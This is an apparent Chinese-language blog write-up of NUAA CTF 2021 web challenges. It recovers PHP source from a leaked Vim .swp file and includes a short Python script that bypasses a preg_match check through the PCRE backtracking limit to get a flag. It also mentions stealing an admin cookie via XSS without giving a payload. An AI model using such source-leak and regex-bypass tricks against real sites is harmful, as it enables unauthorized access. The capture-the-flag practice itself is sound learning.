---
title: NUAA CTF 2021 Web Write up
date: 2021-04-10 20:23:04
categories:	CTF
tags: 
  - CTF
  - WP 
description: 第一场正式的的CTF比赛WP
sticky:
keywords:
cover:
copyright:
copyright_author:
copyright_author_href:
copyright_url:
copyright_info:
---

# NUAA CTF 2021 Web Write up

## 签到题
打开环境，查看网页源代码，即发现flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328195900666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_20,color_FFFFFF,t_70)


## DDoSme
打开环境，提示Do you kNow .swp file? 直接百度，查到
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328204502583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70)

于是知道会要用到Linux
用dirsearch扫一下网站目录，发现了.index.php.swp文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328204551203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70)


地址栏URL后面输入`.index.php.swp`下载swp文件
这个时候用notepad打开发现全是乱码，百度发现
![](https://img-blog.csdnimg.cn/20210328200950634.png)

于是复制到Linux虚拟机中，

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328204652570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70)


再
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328201104698.png)

得到还原后的PHP文件

```php
<?php
function areyouok($greeting){
    return preg_match('/Baby.*PHP/is',$greeting);
}

$greeting=@$_POST['greeting'];
if(!is_array($greeting)){
    if(!areyouok($greeting)){
        if(strpos($greeting,'Baby PHP')!==false){
            echo 'flag{xxxxxx}';
        }else{
            echo 'Do you kNow .swp file?';
        }
    }else{
        echo 'Do you know PHP?';
    }
}
?>

```
emmm…PHP学的还不多，看不懂，果断度娘，发现……竟然跟18年i春秋圣诞欢乐赛题一样…原理就是pcre具有回溯上限，当回溯超过上限时返回 false，从而绕过正则匹配函数(虽然俺不懂，但俺会CV大法)
链接:[2018年i春秋圣诞欢乐赛Web WP](https://www.jianshu.com/p/68f3c8e5d2b4)
然后通过Python写个脚本：

```python
import requests
from io import BytesIO

files = {
  'greeting':('Baby PHP' + 'a' * 1000000)
}

res = requests.post('http://server.cooook.icu:10003/index.php', data=files, allow_redirects=False)
print(res.text)
```
运行之后，成功拿到flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328204722851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70)


## easy_xss
看题目知道是xss跨站脚本漏洞攻击
题目要求是：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328201752270.png)
扫了下网站
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328201935905.png)
看到了upload.php，试了一下emmm确实打不开
所以要登入管理员界面，xss攻击，想到了窃取cookie绕过登录，
而且正好点开Read sample post出现了管理员发表的文章

然后..就卡住了(っ °Д °)っ
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328204809754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_64,color_FFFFFF,t_70)


## base64

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021032821021262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_32,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210328210244539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_SGFpcnNoZWVw,size_48,color_FFFFFF,t_70)
emmm……PHP，Base64，这俩合一起....看了度娘都看不懂...毫无思路


比完赛，感觉 我是废物（；´д｀）ゞ
